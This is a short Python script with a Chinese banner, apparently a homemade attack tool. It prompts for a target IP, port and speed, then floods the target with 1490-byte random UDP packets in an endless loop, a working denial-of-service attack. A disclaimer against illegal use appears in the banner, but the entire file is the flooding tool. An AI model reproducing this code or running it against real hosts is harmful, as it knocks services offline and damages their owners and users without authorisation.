import os,time,socket,random
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
os.system("cls")
print (" ")
print ("/---------------------------------------------------\ ")
print ("|   作者          : myh——                           |")
print ("|   版本          : V1.0.0                          |")
print ("\---------------------------------------------------/")
print ("                      》~~~《   ")
print (" -----------------[请勿用于违法用途]----------------- ")
print (" ")
ip = input("请输入 IP     : ")
port = int(input("攻击端口   post   : "))
sd = int(input("攻击速度(1~1000) run: "))
os.system("cls")
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     print ("已发送 %s 个数据包到 %s 端口 %d"%(sent,ip,port))
     time.sleep((1000-sd)/2000)